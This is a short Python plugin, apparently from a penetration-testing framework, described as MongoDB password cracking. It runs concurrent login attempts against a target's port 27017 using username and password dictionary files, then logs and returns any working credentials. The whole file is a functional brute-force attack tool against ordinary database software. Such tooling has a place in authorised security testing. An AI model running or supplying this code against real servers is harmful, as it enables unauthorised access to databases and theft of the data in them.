# -*-* coding:UTF-8
import os
from pymongo import MongoClient


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "mongodb服务口令破解",
        "datetime": "2022-01-02"
    }

    def ip(self) -> dict:
        with self.async_pool(max_workers=self.target.setting.asyncio, threshold=self.threshold) as execute:
            for username, password in self.build_login_dict(
                    method=self.target.args.method,
                    username=self.target.args.username or os.path.join('data', 'mongo_username'),
                    password=self.target.args.password or os.path.join('data', 'mongo_password'),
            ):
                execute.submit(self.task, username, password)
            return {'LoginInfo': execute.result()}

    async def task(self, username, password):
        self.log.debug(f'Login => username: {username}, password: {password}')
        conn = MongoClient(
            host=self.target.value,
            port=27017,
            username=username,
            password=password,
            authSource="admin",
            serverSelectionTimeoutMS=self.target.args.timeout
        )
        conn.list_database_names()
        conn.close()
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': 27017,
            'server': 'mongodb',
            'username': username,
            'password': password
        }
